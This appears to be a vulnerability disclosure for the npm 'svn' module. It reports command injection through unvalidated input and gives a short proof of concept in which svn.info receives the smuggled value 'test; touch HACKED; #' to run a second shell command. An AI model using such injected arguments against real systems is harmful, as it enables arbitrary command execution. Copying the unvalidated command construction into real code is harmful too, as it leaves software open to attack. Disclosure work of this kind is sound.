# Description

The `svn` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# POC

1. Create the following PoC file:

```js
// poc.js
var SVN = require('svn');
var svn = new SVN('./working_copy');
svn.info("test; touch HACKED; #", function(){});

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i svn # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
